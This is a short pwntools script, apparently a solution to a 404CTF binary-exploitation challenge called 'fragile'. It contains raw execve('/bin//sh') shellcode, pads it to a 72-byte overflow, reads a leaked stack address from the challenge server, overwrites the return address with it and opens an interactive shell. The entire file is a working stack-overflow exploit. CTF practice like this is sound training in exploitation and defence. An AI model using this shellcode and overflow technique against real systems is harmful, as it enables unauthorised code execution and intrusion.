from pwn import *

N = 72

shellcode = bytes("\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05", 'latin-1')
padding = bytes("*", 'latin-1') * (N - len(shellcode))
ret = bytes("\n", "latin-1")


#p = process("./fragile")
p = remote('challenge.404ctf.fr', 31720)
retstr = p.recvuntil(b'\n', drop=True).decode('utf-8')
retstr = p.recvuntil(b'\n', drop=False).decode('utf-8')

addr = retstr.split(":")[1].strip()
address = bytes.fromhex(addr[2:])
address = address[::-1]

payload = shellcode + padding + address + ret
p.send(payload)

p.interactive()